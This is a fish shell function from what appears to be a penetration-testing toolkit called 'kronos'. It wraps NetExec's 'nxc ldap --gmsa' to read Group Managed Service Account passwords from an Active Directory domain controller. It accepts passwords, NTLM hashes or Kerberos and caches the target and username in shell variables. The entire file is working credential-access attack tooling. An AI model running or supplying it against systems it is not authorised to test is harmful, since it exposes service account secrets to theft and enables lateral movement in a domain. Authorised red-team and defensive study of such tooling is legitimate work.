# description: Read GMSA passwords using nxc ldap
function __kronos_gmsa --description "Read GMSA passwords using nxc ldap"
    argparse h/help q/quiet u/username= p/password= H/hash= k/kerberos w/wizard -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos gmsa [TARGET] [OPTIONS]"
        echo ""
        echo "Read GMSA passwords using nxc ldap."
        echo ""
        echo "Options:"
        echo "  -u, --username USER Auth username"
        echo "  -p, --password PASS Auth password"
        echo "  -H, --hash HASH     Auth NTLM hash"
        echo "  -k, --kerberos      Use Kerberos authentication"
        echo "  -q, --quiet         Skip prompts and use fallbacks"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $argv[1]
    set -l auth_user $_flag_username
    set -l auth_pass $_flag_password

    # Standard Fallbacks & Cache
    if test -z "$target"
        set target $__KRONOS_CACHE_GMSA_TARGET
        if test -z "$target"; set target $TGT_DC_IP; end
        if test -z "$target"; set target $TGT_DC; end
        if test -z "$target"; set target $TGT; end
    end

    if test -z "$auth_user"
        set auth_user $__KRONOS_CACHE_GMSA_AUTH_USER
        if test -z "$auth_user"; set auth_user $TGT_USERNAME; end
        if test -z "$auth_user"; set auth_user $TGT_CRED_USERNAME; end
    end
    if test -z "$auth_pass"
        set auth_pass $__KRONOS_CACHE_GMSA_AUTH_PASS
        if test -z "$auth_pass"; set auth_pass $TGT_PASSWORD; end
        if test -z "$auth_pass"; set auth_pass $TGT_CRED_PASSWORD; end
    end

    # Interactive Fallback
    if not set -q _flag_quiet
        if test -z "$target"; or set -q _flag_wizard
            set target (__kronos_ask "Target DC IP/Hostname" "$target"); or return 1
            set -U __KRONOS_CACHE_GMSA_TARGET "$target"
        end
        if test -z "$auth_user"; and not set -q _flag_kerberos
            set auth_user (__kronos_ask "Auth Username" "$auth_user"); or return 1
            set -U __KRONOS_CACHE_GMSA_AUTH_USER "$auth_user"
        end
    end

    if test -z "$target"; echo "error: target is required" >&2; return 1; end

    set -l nxc_cmd nxc ldap "$target"
    if test -n "$TGT_DC_DOMAIN"; set -a nxc_cmd -d "$TGT_DC_DOMAIN"; end

    if set -q _flag_kerberos
        set -a nxc_cmd -k -u "$auth_user" -p ''
    else
        if test -z "$auth_user"
            echo "error: credentials required" >&2
            return 1
        end
        set -a nxc_cmd -u "$auth_user"
        if set -q _flag_hash
            set -a nxc_cmd -H "$_flag_hash"
        else
            set -a nxc_cmd -p "$auth_pass"
        end
    end

    set -a nxc_cmd --gmsa

    __kronos_check_dep nxc; or return 1

    echo "[*] Reading GMSA passwords via nxc ldap..."
    command $nxc_cmd
end
